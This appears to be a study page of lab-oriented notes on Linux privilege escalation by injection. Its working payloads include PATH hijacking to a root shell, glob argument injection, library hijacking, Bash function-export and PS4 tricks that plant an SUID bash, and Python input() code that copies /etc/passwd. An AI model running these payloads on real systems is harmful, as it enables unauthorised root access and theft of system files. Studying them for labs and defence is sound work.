# Injection

<div class="row row-cols-lg-2"><div>

If there is some code that can is executed as another user, for instance, a [scheduled task](../topics/tasks.md) or a [program with the SUID bit](../topics/perms.md#suidguid-bit), you may be able to modify the code behavior using injection.

➡️ You may need/want to create a [root bash](rootbash.md).
</div><div>

There are basic scenarios in which you can directly exploit the executable, but in other scenarios, you may have to exploit the environment itself. In short, it means you may:

* 🌸 edit the environment variables
* 🌿 edit the files used by the program
* 🎭 create a file named after the parameters of the command. For instance, if the code uses a glob-pattern, the pattern will be replaced with the matching files. So, you may inject parameters.
* 🐦 use a flaw in the script language
* ...
</div></div>

<hr class="sep-both">

## Path Environment variable 🌸

[![linprivesc](../../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![commonlinuxprivesc](../../../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![mustacchio](../../../../_badges/thm-p/mustacchio.svg)](https://tryhackme.com/room/mustacchio)
[![bash_system_1](../../../../_badges/rootme/app_script/bash_system_1.svg)](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)
[![bash_system_2](../../../../_badges/rootme/app_script/bash_system_2.svg)](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2)

<div class="row row-cols-lg-2"><div>

If you can run a script, you may try to see if the script uses your PATH to work. The easiest way to test that is to empty your PATH.

```shell!
$ bash -c 'export PATH=; <execute the script>'
"xxx" command not found ====> OK!
```

You can then try to replace the command binary by a [rootbash](rootbash.md). 

```
$ ls /tmp/rootbash # assuming you created your rootbash
$ ln -s /tmp/rootbash # replace the command "xxx"
$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
<your bash is called>
```

⚠️ If you are not able to edit the PATH, try to see if you can write files in a folder in the PATH that is before the original folder.
</div><div>

Unfortunately, this doesn't work when the command is invoked with some options, such as `tail -f /var/log/nginx/access.log`.

The trick is to create a script that launches our command. Refer to [Root Bash Script](rootbash.md).

```shell!
$ ln -s /tmp/root.sh /tmp/xxx # your command
$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
<your bash is called>
```
</div></div>

<hr class="sep-both">

## Parameters injection  🎭

[![linuxstrengthtraining](../../../../_badges/thm/linuxstrengthtraining.svg)](https://tryhackme.com/room/linuxstrengthtraining)
[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)

<div class="row row-cols-lg-2"><div>

We can inject arguments when [glob-patterns](/operating-systems/linux/_knowledge/index.md#glob-patterns) are replaced, e.g., by creating file named after the command arguments.

To execute any command manipulating a filename starting with `-`, you need to use `--` such as `rm -- -la` to remove the file `-la`.
</div><div>

For instance, to inject `-la` into `ls *`:

```shell!
$ touch -- -la
$ ls
-la
$ ls * # * was replaced by -la
total 8
drwxr-xr-x 2 xxx xxx 4096 Apr 29 18:50 .
drwxr-xr-x 9 xxx xxx 4096 Apr 29 18:50 ..
-rw-r--r-- 1 xxx xxx    0 Apr 29 18:50 -la
```

</div></div>

<hr class="sep-both">

## Library Hijacking

[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)

<div class="row row-cols-lg-2"><div>

Shared Object Hijacking or Linker Hijacking is a technique in which we load a malicious `.so` file when executing a binary such as `ls` in a misconfigured environment.

For instance, we may have write access to a folder such as `/lib` or `/usr/lib` which are used by default when linking an executable. It's also possible that `/etc/ld.so.conf` was misconfigured.

If we found a suspicious binary, we can examine it:

```ps
$ ldd <binary>
$ readelf -d <binary>
```
</div><div>

If the binary has the `RUNPATH` folder set, then, if we can write `.so` to this folder, we can compromise it.

To write a static binary, [refer to LD_PRELOAD](../topics/sudo.md#ld_preload).

Misconfigured Python installations may also be vulnerable if we are able to write python script in the module path.

```shell!
$ python3 -c 'import sys; print("\n".join(sys.path))'
```

Then, check every imported package using `pip3 show <package>`. If the package is imported from a location that is below a folder in which you can write to, then you can inject your own code.
</div></div>

<hr class="sep-both">

## Bash scripts failures 🐦

<div class="row row-cols-lg-2"><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allows us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash!
function /some/path { /bin/bash -p; }
export -f /some/path
```
</div><div>

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```shell!
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>

<hr class="sep-both">

## Special scenarios 📚

<div class="row row-cols-lg-2"><div>

As a reminder, if you can execute commands, then refer to [command injection](/cybersecurity/red-team/s3.exploitation/vulns/injection/command.md) for a list of tips and tricks.

<br>

#### Python input() function

[![python_input](../../../../_badges/rootme/app_script/python_input.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-input)

This command is used to prompt the user for input. The problem is that we can write python code <small>(e.g., 5+5)</small>.

```py
open('/tmp/passwd_dump', 'w').write(open('/etc/passwd', 'r').read())
```
</div><div>

#### Latex directives

[![latex_input](../../../../_badges/rootme/app_script/latex_input.svg)](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)

If we can compile LaTeX, we may be able to 

* Execute commands
* Read non-LaTeX files using `\input{path_to_file}` or using `\usepackage{verbatim} \verbatiminput{myfile.txt}` (comments)

#### Bash Script Arguments

[![bash_unquoted](../../../../_badges/rootme/app_script/bash_unquoted.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-unquoted-expression-injection)

If the script uses the argument without quoting them nor validating them, we may be able to inject parameters.

```
$ cat xxx.sh
ls $1
$ ./xxx.sh "-la ."
```
</div></div>